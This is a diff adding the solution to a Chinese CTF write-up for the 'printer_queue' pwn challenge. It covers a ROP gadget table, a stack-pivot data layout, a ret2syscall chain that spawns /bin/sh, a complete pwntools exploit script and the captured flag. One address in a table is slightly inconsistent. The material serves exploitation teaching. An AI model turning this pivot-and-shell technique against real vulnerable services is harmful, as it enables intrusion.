@@ -1,7 +1,10 @@
 # 自助打印机 - WriteUp  
+
+:heavy_check_mark: 本题解提供了 [exploit 代码](../code/exploits/printer_queue.py)  
+
 > 本题知识点：  
-> 基本ROP链的构造  
-> 栈迁移  
+> :star::star: 基本ROP链的构造  
+> :star::star::star::star: 栈迁移  
 
 ## 初步检查  
 拿到手先**checksec**一下：  
@@ -27,12 +30,12 @@ Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RU
 **ROPgadget**过程省略，以下列出了需要的 **gadgets** ：  
 |地址|gadget|
 |-|-|
-|$\texttt{0x401876}$|$\texttt{leave; ret}$|
-|$\texttt{0x42149b}$|$\texttt{pop rax; ret}$|
-|$\texttt{0x432e48}$|$\texttt{pop rdi; ret}$|
-|$\texttt{0x402b86}$|$\texttt{pop rsi; ret}$|
-|$\texttt{0x471a77}$|$\texttt{pop rbx; ret}$|
-|$\texttt{0x41f83b}$|$\texttt{mov rdx, rbx; syscall}$|
+|0x401876|$\texttt{leave; ret}$|
+|0x42149B|$\texttt{pop rax; ret}$|
+|0x432E48|$\texttt{pop rdi; ret}$|
+|0x402B86|$\texttt{pop rsi; ret}$|
+|0x471A77|$\texttt{pop rbx; ret}$|
+|0x41F83B|$\texttt{mov rdx, rbx; syscall}$|
 
 ## 栈迁移  
 ### 引入
@@ -75,4 +78,89 @@ pop rbp         // 恢复至旧rbp，此时rsp指向call压入的返回地址
 
 > :warning: 注意这里的 **+8**，我第一次就漏掉导致了段错误  
 
-## 解题
+## 解题  
+以下将第一次输入数据的地址称作 `queue_addr`。  
+
+### 输入 #1  
+通过实际测试发现，靶机上使用了 **busybox**，因此使用 `execve` 时**必须**设置正确的*argv*和*envp*，我们可以在第一段输入的数据的前一段构造符合要求的**指针数组**传给`execve`：  
+|偏移值|数据|长度|
+|-|-|-|
+|0x00|"/bin/sh", 0|0x08|
+|0x08|0|0x08|
+|0x10|**queue_addr** + 0x20|0x08|
+|0x18|0|0x08|
+|0x20|"sh",0,0,0,0,0,0|0x08|
+|0x28|**ROP链**|-|
+
+接下来是构造ROP链，目标为：  
+```c
+// syscall 0x3B
+execve("/bin/sh", "sh", NULL);
+```  
+
+构造 **ret2syscall** 的ROP链：  
+|实际数据（补足8字节）|gadget或说明|
+|-|-|
+|0x42149B|$\texttt{pop rax; ret}$|
+|0x3B|***execve的syscall号***|
+|0x432E48|$\texttt{pop rdi; ret}$|
+|0x4A9A80|***第一段输入数据的地址 `queue_addr`***|
+|0x402B86|$\texttt{pop rsi; ret}$|
+|0x4A9AE0|***queue_addr+0x10***|
+|0x471A77|$\texttt{pop rbx; ret}$|
+|0|***空指针***|
+|0x41F83B|$\texttt{mov rdx, rbx; syscall}$|  
+
+## 输入 #2  
+第二段便是简单的**栈溢出ROP**，先将缓冲区用垃圾数据填满，再覆盖目标位置，即 `queue_addr - 8` 处（因为第二次`leave; ret`后，`rsp`会指向`old_rbp+8`处）  
+
+```python
+payload2  = b'A' * 16
+payload2 += p64(queue_addr + 32)
+payload2 += p64(leaveret)
+payload2 += p64(leaveret)
+```  
+
+## 最终 Exploit 脚本  
+```python
+# 栈迁移
+# syscall 0x3b: execve(filename, argv, envp)
+# execve("/bin/sh", "sh", 0)
+
+from pwn import *
+context(os='linux', arch='amd64')
+
+port = 0
+r = remote('localhost', port) if port != 0 else process("./printer_queue")
+
+queue_addr = 0x4A9A80
+syscall = 0x401324      # syscall
+raxret = 0x42149b       # pop rax; ret
+rdxsyscall = 0x41f83b   # mov rdx, rbx; syscall
+rbxret = 0x471a77       # pop rbx; ret
+leaveret = 0x401876     # leave; ret
+rdiret = 0x432e48       # pop rdi; ret
+rsiret = 0x402b86       # pop rsi; ret
+ret = 0x40101a          # ret
+
+payload2 = b'A' * 16 + p64(queue_addr + 32) + p64(leaveret) + p64(leaveret)
+payload1 = b'/bin/sh\0'             # +00
+payload1 += p64(0)                  # +08
+payload1 += p64(queue_addr + 32)    # +10
+payload1 += p64(0)                  # +18
+payload1 += b'sh\0\0\0\0\0\0'       # +20
+payload1 += p64(raxret) + p64(0x3b) + p64(rdiret) + p64(queue_addr) + p64(rsiret) + p64(queue_addr + 16) + p64(rbxret) + p64(0) + p64(rdxsyscall)
+
+r.sendafter(b'[printer] Send print queue data:\n', len(payload1).to_bytes(2, 'little'))
+r.send(payload1)
+r.sendafter(b'[printer] Confirm the print job with a 40-byte ticket:\n', payload2)
+
+r.interactive()
+```
+
+```bash
+$ cat /flag
+moectf{printer_queue_stack_pivot}
+```
+
+200pts 到手！
